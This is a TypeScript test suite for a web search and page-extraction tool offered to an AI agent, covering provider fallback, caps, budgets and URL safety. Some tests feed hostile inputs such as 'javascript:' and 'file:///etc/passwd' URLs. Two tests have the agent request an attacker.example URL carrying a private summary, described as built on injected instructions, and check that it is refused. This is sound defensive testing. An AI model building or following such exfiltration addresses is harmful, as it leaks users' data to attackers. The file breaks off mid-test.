import test, { type TestContext } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { copyFileSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import { StreamableHTTPClientTransport } from '@modelcontextprotocol/sdk/client/streamableHttp.js';
import { z } from 'zod';
import type { Actor, Caller } from '@merv/contracts';
import { ToolRegistry, conversationUse, describeTool } from '../packages/api/src/registry.js';
import { fit } from '../packages/pi/src/fit.js';
import { piTool } from '../packages/pi/src/relay-schema.js';
import { piModelToolName } from '../packages/pi/src/tool-names.js';
import { WebService } from '../packages/web/src/index.js';
import { webTools } from '../packages/web/src/tools.js';
import { webConfig } from '../packages/web/src/input.js';
import { jsonBytes, MAX_ANSWER_BYTES } from '../packages/web/src/normalize.js';
import { USER_AGENT } from '../packages/web/src/providers.js';
import type { WebCall, WebPage, WebSearch } from '../packages/web/src/types.js';
import { loadConfiguration } from '../src/config.js';
import { createApp } from './fixtures/app.js';
import { fixture as piFixture } from './fixtures/pi.js';
import { keyEnv, provider, tavilyResults, type Reply } from './fixtures/web.js';
import { deferred } from './fixtures/deferred.js';

const caller: Caller = { actorId: 'alice', projectId: 'project-a', credentialId: 'key-alice' };
const open = { require: async () => ({}) as Actor };

/** The registry as a transport calls it, with the web tools `web` offers. */
function registry(t: TestContext, web: WebService) {
  const tools = new ToolRegistry(open);
  for (const tool of webTools(web)) tools.register(tool);
  t.after(() => tools.close());
  return tools;
}

test('a search reaches Tavily as Nisa sends it and returns within Nisa’s caps, allowlisted', async (t) => {
  const tavily = await provider(t, () => ({
    body: {
      query: 'echoed',
      answer: 'unrequested answer',
      response_time: 1.2,
      token: 'upstream-secret',
      results: [
        ...tavilyResults(5, 8000).results.map((result) => ({
          ...result,
          score: 0.123456,
          raw_content: 'raw page text',
          token: 'upstream-secret',
        })),
        { title: 'Script', url: 'javascript:alert(1)', content: 'never shown', score: 1 },
        { title: 'Short', url: 'https://example.org/short', content: 'short', score: 'high' },
      ],
    },
  }));
  const web = new WebService({ keyEnv: keyEnv(t, 'tvly-fixture'), origin: tavily.origin });
  const tools = registry(t, web);
  const search = async (input: object) =>
    (await tools.call('web.search', caller, input)) as WebSearch;

  const result = await search({
    query: [' flash attention ', '', 'FA3'],
    max_results: 25,
    search_depth: 'Deep',
    topic: 'sports',
    time_range: 'w',
  });
  assert.deepEqual(
    tavily.seen.map(({ method, path, body }) => [method, path, body]),
    [
      [
        'POST',
        '/search',
        {
          query: '(flash attention) OR (FA3)',
          max_results: 20,
          search_depth: 'basic',
          topic: 'general',
          time_range: 'week',
        },
      ],
    ],
  );
  assert.equal(tavily.seen[0].headers.authorization, 'Bearer tvly-fixture');
  assert.equal(tavily.seen[0].headers['user-agent'], USER_AGENT);
  assert.deepEqual(Object.keys(result).sort(), [
    'content_budget_chars',
    'content_truncated',
    'normalization_note',
    'provider',
    'query',
    'result_count',
    'results',
  ]);
  assert.equal(result.provider, 'tavily');
  assert.equal(
    result.normalization_note,
    'combined 2 query variants into one web request; max_results=25 replaced with 20; ' +
      `search_depth="deep" replaced with 'basic'; topic="sports" replaced with 'general'`,
  );
  // Four results fill the 24,000 characters at 6,000 each; later ones keep their links only.
  assert.equal(result.result_count, 6);
  assert.deepEqual(
    result.results.map(({ content }) => content.length),
    [6000, 6000, 6000, 6000, 0, 0],
  );
  assert.ok(result.results[0].content.endsWith('\n... [truncated]'));
  assert.equal(result.content_truncated, true);
  assert.equal(result.content_budget_chars, 24_000);
  assert.deepEqual(result.results.at(-1), {
    title: 'Short',
    url: 'https://example.org/short',
    content: '',
    score: 0,
  });
  for (const entry of result.results) {
    assert.deepEqual(Object.keys(entry).sort(), ['content', 'score', 'title', 'url']);
    assert.match(entry.url, /^https:\/\//);
  }
  assert.equal(result.results[0].score, 0.123);
  assert.doesNotMatch(JSON.stringify(result), /token|upstream-secret|raw page|unrequested/);

  // Nothing to search for is answered without a request.
  const asked = tavily.seen.length;
  for (const query of ['', '   ', 'site:example.com', ['', ' '], 'site:example.com/']) {
    const answer = await search({ query });
    assert.equal(answer.status, 'needs_query_terms', JSON.stringify(query));
    assert.equal(answer.result_count, 0);
    assert.equal(answer.provider, undefined);
    assert.ok(answer.fallback_hint);
  }
  assert.equal(tavily.seen.length, asked);
  // An exact page's path becomes its terms; blank optional fields are dropped quietly.
  const site = await search({
    query: 'site:docs.example.com/guide/flash-attention_3',
    max_results: null,
    time_range: '',
  });
  assert.deepEqual(tavily.seen.at(-1)!.body, {
    query: 'site:docs.example.com guide flash attention 3',
    max_results: 5,
    search_depth: 'basic',
    topic: 'general',
  });
  assert.match(site.normalization_note!, /expanded exact site target/);
  // Phrasings are combined only while Tavily's 400 characters allow.
  const long = await search({ query: ['a'.repeat(300), 'b'.repeat(300)], time_range: 'decade' });
  assert.equal(tavily.seen.at(-1)!.body.query, 'a'.repeat(300));
  assert.equal(
    long.normalization_note,
    `combined 1 query variant into one web request (of 2 given); unsupported time_range="decade" omitted`,
  );
  await assert.rejects(search({ query: 'x'.repeat(401) }), { code: 'invalid_input' });
  await assert.rejects(search({ query: 'x', site: 'example.com' }), { code: 'invalid_input' });
});

/** An OpenAI Responses answer from the hosted web_search tool. */
const grounded = (text = 'FlashAttention 3 is faster [one](https://a.example/one).') => ({
  id: 'resp_1',
  object: 'response',
  status: 'completed',
  model: 'gpt-test',
  token: 'upstream-secret',
  output: [
    {
      type: 'web_search_call',
      id: 'ws_1',
      status: 'completed',
      action: {
        type: 'search',
        query: 'q',
        sources: [
          { type: 'url', url: 'https://a.example/one' },
          { type: 'url', url: 'https://b.example/two', title: 'Two' },
          { type: 'url', url: 'file:///etc/passwd', title: 'Local' },
        ],
      },
    },
    { type: 'reasoning', id: 'rs_1', summary: [], encrypted_content: 'opaque' },
    {
      type: 'message',
      id: 'msg_1',
      role: 'assistant',
      content: [
        {
          type: 'output_text',
          text,
          annotations: [
            { type: 'url_citation', url: 'https://a.example/one', title: 'One' },
            { type: 'url_citation', url: 'https://c.example/three', title: ' ' },
          ],
        },
      ],
    },
  ],
});

test('Tavily falls back to OpenAI’s hosted web search exactly when Nisa does', async (t) => {
  let tavilyReply: Reply = {};
  let openaiReply: Reply = { body: grounded() };
  const tavily = await provider(t, () => tavilyReply);
  const openai = await provider(t, () => openaiReply);
  const tavilyEnv = keyEnv(t, 'tvly-fixture');
  const openaiEnv = keyEnv(t, 'sk-fixture');
  const config = {
    keyEnv: tavilyEnv,
    origin: tavily.origin,
    fallback: { keyEnv: openaiEnv, origin: openai.origin, model: 'gpt-test' },
  };
  const web = new WebService(config, { log: () => {} });
  const refusal = (status: number): Reply => ({
    status,
    body: { detail: { error: 'upstream words never repeated' } },
  });
  const input = { query: 'q', search_depth: 'advanced', topic: 'news', time_range: 'month' };
  // A missing, invalid or forbidden key, or a used-up plan: never a rate limit, which passes.
  for (const status of [401, 403, 432, 433]) {
    tavilyReply = refusal(status);
    const [tried, grounding] = [tavily.seen.length, openai.seen.length];
    const result = await web.search(caller, input);
    assert.equal(tavily.seen.length - tried, 1, `${status}`);
    assert.equal(openai.seen.length - grounding, 1);
    assert.equal(result.provider, 'openai_web_search');
    assert.equal(result.normalization_note, 'Tavily unavailable; used OpenAI web search');
  }
  const [call] = openai.seen;
  assert.equal(call.path, '/v1/responses');
  assert.equal(call.headers.authorization, 'Bearer sk-fixture');
  assert.equal(call.headers['user-agent'], USER_AGENT);
  const { input: prompt, ...body } = call.body;
  assert.deepEqual(body, {
    model: 'gpt-test',
    tools: [{ type: 'web_search' }],
    include: ['web_search_call.action.sources'],
    // One budgeted call is at most two hosted searches, one for a basic one.
    max_tool_calls: 2,
    reasoning: { effort: 'low' },
    max_output_tokens: 4096,
    store: false,
  });
  for (const part of [
    'Return no more than 5 distinct sources.',
    'Prioritize news sources.',
    'Prioritize results from the last month.',
    '\n\nQuery: q',
  ])
    assert.ok(prompt.includes(part), part);
  const result = await web.search(caller, { query: 'q', max_results: 2 });
  assert.deepEqual(result, {
    query: 'q',
    provider: 'openai_web_search',
    answer: 'FlashAttention 3 is faster [one](https://a.example/one).',
    // Distinct http(s) sources, the search's own first; a missing title is the host.
    results: [
      { title: 'a.example', url: 'https://a.example/one', content: '', score: 1 },
      { title: 'Two', url: 'https://b.example/two', content: '', score: 0.5 },
    ],
    result_count: 2,
    normalization_note: 'Tavily unavailable; used OpenAI web search',
  });
  assert.equal(openai.seen.at(-1)!.body.max_output_tokens, 2048);
  assert.equal(openai.seen.at(-1)!.body.max_tool_calls, 1);

  // Anything else is Tavily's failure, retried when it may pass, and never falls back: a rate
  // limit (429) included, which Nisa does not fall back on either.
  for (const [status, tries, code, http] of [
    [500, 3, 'web_upstream_error', 502],
    [429, 3, 'web_rate_limited', 429],
    [400, 1, 'web_request_refused', 422],
  ] as const) {
    tavilyReply = refusal(status);
    const [tried, grounding] = [tavily.seen.length, openai.seen.length];
    await assert.rejects(web.search(caller, input), (error: any) => {
      assert.equal(error.code, code);
      assert.equal(error.status, http);
      assert.equal(error.message.includes('upstream words'), false);
      return true;
    });
    assert.equal(tavily.seen.length - tried, tries);
    assert.equal(openai.seen.length, grounding);
  }
  // Both failing say so, as Nisa does; the fallback's answer is capped as Nisa caps it.
  tavilyReply = refusal(401);
  openaiReply = refusal(500);
  await assert.rejects(web.search(caller, input), {
    code: 'web_upstream_error',
    status: 502,
    message:
      "Web search failed through both Tavily and OpenAI: Tavily refused this deployment's key (HTTP 401); OpenAI web search failed (HTTP 500)",
  });
  openaiReply = { body: grounded('x'.repeat(30_000)) };
  const capped = await web.search(caller, input);
  assert.equal(capped.answer, 'x'.repeat(24_000) + '\n... [OpenAI web answer truncated]');
  assert.doesNotMatch(JSON.stringify(capped), /token|upstream-secret|opaque|passwd/);

  // Without a Tavily key the fallback serves alone, and Tavily hears nothing.
  const tried = tavily.seen.length;
  const alone = new WebService({ ...config, keyEnv: 'MERV_WEB_TEST_UNSET_KEY' }, { log: () => {} });
  assert.equal(
    (await alone.search(caller, input)).normalization_note,
    'Tavily is not configured; used OpenAI web search',
  );
  assert.equal(tavily.seen.length, tried);
  // Without a fallback, a refusal is the caller's answer: never 401 or 403, which a transport
  // would take for the caller's own.
  const only = new WebService({ keyEnv: tavilyEnv, origin: tavily.origin });
  for (const [status, code] of [
    [401, 'web_provider_refused'],
    [432, 'web_quota_exhausted'],
  ] as const) {
    tavilyReply = refusal(status);
    await assert.rejects(only.search(caller, input), { code, status: 503 });
  }
  const none = new WebService({ keyEnv: 'MERV_WEB_TEST_UNSET_KEY', origin: tavily.origin });
  await assert.rejects(none.search(caller, input), { code: 'web_unavailable', status: 503 });
  assert.equal(none.configured, false);
});

test('a page is read only through Tavily, never fetched by Merv, and cut to its section', async (t) => {
  // The page's own server: Merv must never reach it.
  const page = await provider(t);
  let extracted: Reply = {};
  const tavily = await provider(t, () => extracted);
  const tavilyEnv = keyEnv(t, 'tvly-fixture');
  const web = new WebService({ keyEnv: tavilyEnv, origin: tavily.origin });
  const tools = registry(t, web);
  const read = async (input: object) => (await tools.call('web.extract', caller, input)) as WebPage;
  const url = `${page.origin}/article`;

  extracted = { body: { results: [{ url, raw_content: 'w'.repeat(25_000) }], failed_results: [] } };
  const whole = await read({ url, extract_depth: 'thorough' });
  assert.deepEqual(tavily.seen.at(-1)!.body, { urls: [url], extract_depth: 'basic' });
  assert.equal(tavily.seen.at(-1)!.path, '/extract');
  assert.deepEqual(
    { ...whole, content: whole.content.length },
    {
      url,
      content: 20_000 + '\n\n... [truncated at 20,000 characters]'.length,
      section: false,
      status: 'success',
      provider: 'tavily',
      normalization_note: `unsupported extract_depth="thorough" replaced with 'basic'`,
    },
  );
  const text = 'a'.repeat(1000) + '## Methods' + 'm'.repeat(100) + '## Results' + 'r'.repeat(1000);
  extracted = { body: { results: [{ url, raw_content: '', content: text }] } };
  const methods = await read({
    url,
    extract_depth: 'advanced',
    start_text: '## Methods',
    end_text: '## Results',
  });
  assert.equal(tavily.seen.at(-1)!.body.extract_depth, 'advanced');
  assert.equal(methods.section, true);
  assert.equal(methods.content, text.slice(800, 1000 + 10 + 100 + 10 + 200));
  const missed = await read({ url, start_text: '## Discussion', end_text: '## Results' });
  assert.equal(missed.section, false);
  assert.ok(missed.content.startsWith(text));
  assert.match(missed.content, /start marker "## Discussion" not found/);
  const one = await read({ url, start_text: '## Methods' });
  assert.equal(one.content, text);
  assert.equal(one.normalization_note, 'start_text and end_text select a section only together');

  extracted = { body: { results: [], failed_results: [{ url, error: 'Blocked by robots.txt' }] } };
  const failed = await read({ url });
  assert.equal(failed.status, 'error');
  assert.equal(failed.error, 'Blocked by robots.txt');
  assert.equal(failed.content, '');
  assert.ok(failed.fallback_hint);

  // An address Tavily should not be given is refused before any request.
  const asked = tavily.seen.length;
  for (const bad of [
    'ftp://example.com/x',
    'example.com/page',
    'javascript:alert(1)',
    `http://user:pass@127.0.0.1/`,
    '',
  ]) {
    const refused = await read({ url: bad });
    assert.equal(refused.status, 'needs_valid_url', bad);
    assert.equal(refused.content, '');
  }
  assert.equal(tavily.seen.length, asked);
  assert.equal(page.seen.length, 0, 'Merv fetched the page itself');

  // A refused key is the answer: pages are never read through the fallback.
  const openai = await provider(t, () => ({ body: grounded() }));
  const both = new WebService({
    keyEnv: tavilyEnv,
    origin: tavily.origin,
    fallback: { keyEnv: keyEnv(t, 'sk-fixture'), origin: openai.origin },
  });
  extracted = { status: 401, body: {} };
  await assert.rejects(both.extract(caller, { url }), { code: 'web_provider_refused' });
  assert.equal(openai.seen.length, 0);
  // Where Tavily has no key, search stays and web.extract is not offered at all.
  const searchOnly = new WebService({
    keyEnv: 'MERV_WEB_TEST_UNSET_KEY',
    fallback: { keyEnv: keyEnv(t, 'sk-fixture'), origin: openai.origin },
  });
  assert.equal(searchOnly.reads, false);
  assert.deepEqual(
    webTools(searchOnly).map(({ name }) => name),
    ['web.search'],
  );
  await assert.rejects(searchOnly.extract(caller, { url }), { code: 'web_unavailable' });
  assert.equal(page.seen.length, 0);
});

/** Waits for `condition`, at most five seconds. */
async function until(condition: () => boolean) {
  const deadline = Date.now() + 5000;
  while (!condition() && Date.now() < deadline)
    await new Promise((resolve) => setTimeout(resolve, 10));
  assert.ok(condition());
}
const project = (projectId: string): Caller => ({ ...caller, projectId });

test('a project’s day, the deployment’s and its fallback searches’ are bounded, refused before any request', async (t) => {
  let tavilyReply: Reply = { body: tavilyResults(1) };
  const tavily = await provider(t, () => tavilyReply);
  let now = Date.parse('2026-09-26T23:59:00Z');
  const logged: WebCall[] = [];
  const web = new WebService(
    {
      keyEnv: keyEnv(t, 'tvly-fixture'),
      origin: tavily.origin,
      dailyCallsPerProject: 2,
      dailyCalls: 3,
    },
    { clock: () => now, log: (record) => logged.push(record) },
  );
  await web.search(caller, { query: 'query-one' });
  // Answers that need no provider cost nothing.
  await web.search(caller, { query: '' });
  await web.extract(caller, { url: 'not an address' });
  await web.extract(caller, { url: 'https://example.com/two' });
  for (const call of [
    () => web.search(caller, { query: 'query-three' }),
    () => web.extract(caller, { url: 'https://example.com/three' }),
  ])
    await assert.rejects(call(), {
      code: 'web_budget_exhausted',
      status: 429,
      message: 'This project has made its 2 web calls for today; more are allowed after 00:00 UTC',
    });
  assert.equal(tavily.seen.length, 2);
  // Another project has its own day, but projects cost nothing to make: the deployment's day
  // bounds them all.
  await web.search(project('project-b'), { query: 'query-elsewhere' });
  await assert.rejects(web.search(project('project-c'), { query: 'query-more' }), {
    code: 'web_budget_exhausted',
    status: 429,
    message: 'This deployment has made its 3 web calls for today; more are allowed after 00:00 UTC',
  });
  assert.equal(tavily.seen.length, 3);
  // The next UTC day starts afresh.
  now = Date.parse('2026-09-27T00:00:01Z');
  await web.search(caller, { query: 'query-tomorrow' });
  // One line for each call a provider was asked for: who, which, how long, never what.
  assert.deepEqual(
    logged.map(({ ms, ...rest }) => (assert.equal(typeof ms, 'number'), rest)),
    [
      ['web.search', 'project-a'],
      ['web.extract', 'project-a'],
      ['web.search', 'project-b'],
      ['web.search', 'project-a'],
    ].map(([tool, projectId]) => ({
      event: 'web.call',
      tool,
      projectId,
      actorId: 'alice',
      providers: ['tavily'],
    })),
  );
  assert.doesNotMatch(JSON.stringify(logged), /query-|example\.com/);

  // Fallback searches, each a model's grounded answer, have a smaller day of their own for the
  // whole deployment, and a failed call says which provider failed.
  const openai = await provider(t, () => ({ body: grounded() }));
  const fallback = { keyEnv: keyEnv(t, 'sk-fixture'), origin: openai.origin };
  const both = new WebService(
    { keyEnv: keyEnv(t, 'tvly-fixture'), origin: tavily.origin, fallback, fallbackDailyCalls: 1 },
    { log: (record) => logged.push(record) },
  );
  tavilyReply = { status: 401, body: {} };
  assert.equal((await both.search(caller, { query: 'q' })).provider, 'openai_web_search');
  await assert.rejects(both.search(caller, { query: 'q' }), {
    code: 'web_budget_exhausted',
    status: 429,
    message:
      "Tavily refused this deployment's key (HTTP 401), and this deployment has made its 1 OpenAI web searches for today; more are allowed after 00:00 UTC",
  });
  assert.equal(openai.seen.length, 1);
  assert.deepEqual(
    logged.slice(-2).map(({ providers, code }) => [providers, code]),
    [
      [['tavily', 'openai_web_search'], undefined],
      [['tavily'], 'web_budget_exhausted'],
    ],
  );
  const alone = new WebService(
    { keyEnv: 'MERV_WEB_TEST_UNSET_KEY', fallback, fallbackDailyCalls: 1 },
    { log: () => {} },
  );
  await alone.search(caller, { query: 'q' });
  await assert.rejects(alone.search(caller, { query: 'q' }), {
    code: 'web_budget_exhausted',
    message:
      'This deployment has made its 1 OpenAI web searches for today; more are allowed after 00:00 UTC',
  });
  assert.equal(openai.seen.length, 2);
});

test('calls in flight are shared out by project and wait their turn before web_busy', async (t) => {
  let gate: Promise<void> | undefined;
  const tavily = await provider(t, async () => {
    await gate;
    return { body: tavilyResults(1) };
  });
  const web = new WebService(
    {
      keyEnv: keyEnv(t, 'tvly-fixture'),
      origin: tavily.origin,
      maxInFlight: 3,
      maxInFlightPerProject: 2,
      queueMs: 800,
      dailyCallsPerProject: 3,
    },
    { log: () => {} },
  );
  let release = deferred();
  gate = release.promise;
  // One project holds its two slots; its third call waits its turn, then is refused, charged
  // nothing, and no provider hears of it.
  const held = [web.search(caller, { query: 'a1' }), web.search(caller, { query: 'a2' })];
  await until(() => tavily.seen.length === 2);
  const started = Date.now();
  await assert.rejects(web.search(caller, { query: 'a3' }), { code: 'web_busy', status: 429 });
  assert.ok(Date.now() - started >= 700);
  assert.equal(tavily.seen.length, 2);
  // Another project has the process's third slot, and a fourth call waits for one to end.
  const other = web.search(project('project-b'), { query: 'b1' });
  await until(() => tavily.seen.length === 3);
  const waiting = web.search(project('project-c'), { query: 'c1' });
  await new Promise((resolve) => setTimeout(resolve, 100));
  assert.equal(tavily.seen.length, 3);
  release.resolve();
  gate = undefined;
  await Promise.all([...held, other, waiting]);
  assert.equal(tavily.seen.length, 4);
  // The refused call left its project's day whole: a third call runs, a fourth does not.
  await web.search(caller, { query: 'a4' });
  await assert.rejects(web.search(caller, { query: 'a5' }), { code: 'web_budget_exhausted' });

  // Closing ends the calls in flight and those waiting, at once.
  release = deferred();
  gate = release.promise;
  t.after(() => release.resolve());
  const busy = [
    web.search(project('project-d'), { query: 'd1' }),
    web.search(project('project-d'), { query: 'd2' }),
    web.search(project('project-d'), { query: 'd3' }),
  ];
  await until(() => tavily.seen.length === 7);
  const closing = Date.now();
  web.close();
  for (const call of busy) await assert.rejects(call, { code: 'web_stopped', status: 503 });
  assert.ok(Date.now() - closing < 500);
});

test('a conversation reads only pages its own searches returned; other callers read any', async (t) => {
  const tavily = await provider(t, ({ path, body }) =>
    path === '/search'
      ? { body: tavilyResults(2) }
      : { body: { results: [{ url: body.urls[0], raw_content: 'page text' }] } },
  );
  const web = new WebService(
    { keyEnv: keyEnv(t, 'tvly-fixture'), origin: tavily.origin },
    { log: () => {} },
  );
  const talk = (id: string): Caller => ({
    ...caller,
    conversation: { id, epoch: 1, commandId: 'command', runtimeId: 'runtime' },
  });
  // An address the agent was told to build out of what it read reaches nobody: refused before
  // any request, and charged nothing.
  await assert.rejects(
    web.extract(talk('c1'), { url: 'https://attacker.example/v?d=private-summary' }),
    { code: 'web_address_unsearched', status: 422 },
  );
  assert.equal(tavily.seen.length, 0);
  await web.search(talk('c1'), { query: 'q' });
  // A page its search returned is read, with or without a fragment.
  const page = await web.extract(talk('c1'), { url: 'https://example.com/1#methods' });
  assert.equal(page.status, 'success');
  assert.equal(page.content, 'page text');
  // Another conversation's search opens nothing for this one.
  await assert.rejects(web.extract(talk('c2'), { url: 'https://example.com/1' }), {
    code: 'web_address_unsearched',
  });
  // A worker or an MCP client reads any page: where it is offered, its own shell or client
  // reaches the network anyway.
  assert.equal(
    (await web.extract(caller, { url: 'https://elsewhere.example/' })).status,
    'success',
  );
});

test('an answer at Nisa’s caps still fits what Pi shows of one result, whatever its text', async (t) => {
  // Code-like English escapes a byte or more a character in JSON; CJK takes three.
  const code = 'if (a == "b") {\n\treturn "\\\\n";\n}\n'.repeat(40).slice(0, 1200);
  const cjk = '注意力机制的高效实现'.repeat(1000);
  let reply: Reply = {};
  const tavily = await provider(t, () => reply);
  const openai = await provider(t, () => ({ body: grounded(cjk.repeat(3)) }));
  const web = new WebService(
    {
      keyEnv: keyEnv(t, 'tvly-fixture'),
      origin: tavily.origin,
      fallback: { keyEnv: keyEnv(t, 'sk-fixture'), origin: openai.origin },
    },
    { log: () => {} },
  );
  for (const text of [code, cjk]) {
    reply = {
      body: {
        results: Array.from({ length: 20 }, (_, index) => ({
          title: `Result ${index}`,
          url: `https://example.com/${index}`,
          content: text,
          score: 0.5,
        })),
      },
    };
    const result = await web.search(caller, { query: 'q', max_results: 20 });
    assert.ok(jsonBytes(result) <= MAX_ANSWER_BYTES, `${jsonBytes(result)}`);
    // Pi shows it whole, never an index pointing at a get tool web search does not have.
    assert.deepEqual(fit('web.search', result), result);
    assert.equal(result.result_count, 20);
    assert.equal(result.content_truncated, true);
    assert.ok(result.content_budget_chars! < 24_000);
    const shown = result.results.reduce((sum, { content }) => sum + content.length, 0);
    assert.ok(shown > 5000 && shown <= result.content_budget_chars!, `${shown}`);
  }
  // A page read at its cap, and the fallback's answer at its own.
  reply = { body: { results: [{ url: 'https://example.com/page', raw_content: cjk.repeat(3) }] } };
  const page = await web.extract(caller, { url: 'https://example.com/page' });
  assert.equal(page.status, 'success');
  assert.deepEqual(fit('web.extract', page), page);
  assert.match(page.content, /\n\n\.\.\. \[truncated at [\d,]+ characters\]$/);
  reply = { status: 401, body: {} };
  const grounded_ = await web.search(caller, { query: 'q' });
  assert.equal(grounded_.provider, 'openai_web_search');
  assert.deepEqual(fit('web.search', grounded_), grounded_);
  assert.match(grounded_.answer!, /\[OpenAI web answer truncated\]$/);
  // An answer that fits is left exactly as Nisa's caps make it.
  reply = { body: tavilyResults(4, 6000) };
  const ascii = await web.search(caller, { query: 'q' });
  assert.deepEqual(
    ascii.results.map(({ content }) => content.length),
    [6000, 6000, 6000, 6000],
  );
  assert.equal(ascii.content_truncated, undefined);
});

test('a provider is held to its deadline, its bytes and JSON, and never followed elsewhere', async (t) => {
  const elsewhere = await provider(t);
  let reply: () => Reply | Promise<Reply> = () => ({ body: tavilyResults(1) });
  const tavily = await provider(t, () => reply());
  const web = new WebService({
    keyEnv: keyEnv(t, 'tvly-fixture'),
    origin: tavily.origin,
    timeoutMs: 1000,
    maxResponseBytes: 2048,
  });
  const search = () => web.search(caller, { query: 'q' });
  const started = Date.now();
  reply = () => new Promise<Reply>(() => {});
  await assert.rejects(search(), { code: 'web_timeout', status: 504 });
  assert.ok(Date.now() - started < 4000);
  reply = () => ({ status: 302, headers: { location: `${elsewhere.origin}/collect` } });
  await assert.rejects(search(), { code: 'web_upstream_error', status: 502 });
  assert.equal(elsewhere.seen.length, 0, 'a redirect was followed with the key');
  reply = () => ({ body: tavilyResults(1, 4000) });
  await assert.rejects(search(), { code: 'web_response_too_large', status: 502 });
  reply = () => ({ raw: '<html>maintenance</html>', headers: { 'content-type': 'text/html' } });
  await assert.rejects(search(), { code: 'web_invalid_response', status: 502 });
  reply = () => ({ raw: '[1, 2]' });
  await assert.rejects(search(), { code: 'web_invalid_response' });
  // Closing ends a call in flight at once.
  reply = () => new Promise<Reply>(() => {});
  const asked = tavily.seen.length;
  const pending = search();
  while (tavily.seen.length === asked) await new Promise((resolve) => setTimeout(resolve, 10));
  const waiting = Date.now();
  web.close();
  await assert.rejects(pending, { code: 'web_stopped', status: 503 });
  assert.ok(Date.now() - waiting < 900);
  await assert.rejects(search(), { code: 'web_stopped' });
});

test('web tools are open-world reads: described as such, run without a snapshot, offered to Pi', async (t) => {
  const tavily = await provider(t, () => ({ body: tavilyResults(1) }));
  const web = new WebService({ keyEnv: keyEnv(t, 'tvly-fixture'), origin: tavily.origin });
  let snapshots = 0;
  const tools = new ToolRegistry(open, undefined, async (run) => {
    snapshots++;
    return await run();
  });
  t.after(() => tools.close());
  for (const tool of webTools(web)) tools.register(tool);
  tools.register({
    name: 'local.read',
    description: 'Reads this database',
    readOnly: true,
    inputSchema: z.object({}).strict(),
    handler: () => ({}),
  });
  await tools.call('web.search', caller, { query: 'q' });
  await tools.call('web.extract', caller, { url: 'https://example.com/' });
  assert.equal(snapshots, 0);
  await tools.call('local.read', caller, {});
  assert.equal(snapshots, 1);
  for (const definition of webTools(web)) {
    const description = describeTool(definition);
    assert.deepEqual(description.annotations, { readOnlyHint: true, openWorldHint: true });
    // The agent runs it directly, and the relay takes its schema, which names no address.
    assert.equal(conversationUse(definition, {}), undefined);
    assert.ok(piTool(description, definition.conversation), definition.name);
    assert.doesNotMatch(JSON.stringify(description), /https?:\/\/(?!json-schema\.org)/);
    assert.match(definition.description, /Markdown link/);
  }
  assert.deepEqual(
    webTools(web).map(({ name }) => piModelToolName(name)),
    ['web_search', 'web_extract'],
  );
});

test('a Pi turn is offered web search and runs it as its person, a reader included', async (t) => {
  const tavily = await provider(t, () => ({ body: tavilyResults(2) }));
  const f = await piFixture(t);
  const web = new WebService({ keyEnv: keyEnv(t, 'tvly-fixture'), origin: tavily.origin });
  for (const tool of webTools(web)) f.tools.register(tool);
  const issued = await f.scope.issueActor(f.operator, { name: 'Reader', role: 'reader' });
  const reader: Caller = {
    projectId: f.operator.projectId,
    actorId: issued.actor.id,
    credentialId: issued.credential.id,
  };
  for (const person of [f.operator, reader]) {
    const { token, work, input } = await f.begun(person);
    for (const name of ['web.search', 'web.extract'])
      assert.deepEqual(
        work.tools.find((tool) => tool.name === name)?.readOnly,
        true,
        `${person.actorId} ${name}`,
      );
    const grant = await f.pi.authorizeModel(work.modelToken);
    assert.ok(grant.toolNames.includes('web_search'));
    const result = (await f.pi.tool(token, {
      ...input,
      name: 'web.search',
      input: { query: 'flash attention' },
    })) as WebSearch;
    assert.equal(result.provider, 'tavily');
    assert.deepEqual(
      result.results.map(({ url }) => url),
      ['https://example.com/0', 'https://example.com/1'],
    );
    // Nobody presses Run on a read: the agent may read a page its search returned, and no
    // address it was told to build out of what it has read.
    const refused = (await f.pi.tool(token, {
      ...input,
      name: 'web.extract',
      input: { url: 'https://attacker.example/v?d=summary' },
    })) as { error: { code: string } };
    assert.equal(refused.error.code, 'web_address_unsearched');
    const page = (await f.pi.tool(token, {
      ...input,
      name: 'web.extract',
      input: { url: 'https://example.com/1' },
    })) as WebPage;
    assert.equal(page.status, 'success');
  }
  assert.equal(tavily.seen.length, 4);
  assert.ok(tavily.seen.every(({ body }) => !JSON.stringify(body).includes('attacker')));
});

test('the render composes web search into Main, where MCP clients list and call it', async (t) => {
  const tavily = await provider(t, () => ({ body: tavilyResults(1) }));
  // The deployment's render, from the committed default composition.
  const root = realpathSync(mkdtempSync(join(tmpdir(), 'merv-web-render-')));
  t.after(() => rmSync(root, { recursive: true, force: true }));
  mkdirSync(join(root, 'deploy'));
  mkdirSync(join(root, 'dist/config'), { recursive: true });
  for (const name of ['render-config.mjs', 'schema.mjs'])
    copyFileSync(new URL(`../deploy/${name}`, import.meta.url), join(root, 'deploy', name));
  copyFileSync(
    new URL('../config/default.json', import.meta.url),
    join(root, 'dist/config/default.json'),
  );
  const key = 'tvly-dev-fixtureKey123';
  const rendered = spawnSync(
    process.execPath,
    [join(root, 'deploy/render-config.mjs'), join(root, 'rendered.json')],
    {
      encoding: 'utf8',
      env: {
        MERV_TS_AUTH_MODE: 'hs256',
        MERV_BLOB_PREFIX: 'merv-ts',
        MERV_DB_URL: 'postgresql://unused',
        MERV_BLOB_BUCKET: 'unused',
        MERV_BLOB_ENDPOINT_URL: 'https://storage.example',
        MERV_BLOB_ACCESS_KEY_ID: 'fixture',
        MERV_BLOB_SECRET_ACCESS_KEY: 'fixture',
        SUPABASE_ANON_KEY: 'fixture',
        SUPABASE_JWT_SECRET: 'fixture',
        SUPABASE_URL: 'https://identity.example',
        MERV_TS_PUBLIC_ORIGIN: 'https://merv.example',
        MERV_TAVILY_API_KEY: key,
      },
    },
  );
  assert.equal(rendered.status, 0, rendered.stderr);
  const entries = (
    JSON.parse(readFileSync(join(root, 'rendered.json'), 'utf8')).plugins as {
      id: string;
      name: string;
      config?: Record<string, unknown>;
    }[]
  ).filter(({ id }) => id === 'web' || id === 'web-tools');
  assert.deepEqual(
    entries.map(({ id, name }) => [id, name]),
    [
      ['web-tools', '@merv/web/tools'],
      ['web', '@merv/web'],
    ],
  );
  // Main reads the rendered entry exactly as the plugin's own schema does; only the origin
  // moves to the fake.
  const web = entries.find(({ id }) => id === 'web')!;
  assert.deepEqual(webConfig.parse(web.config), {
    keyEnv: 'MERV_TAVILY_API_KEY',
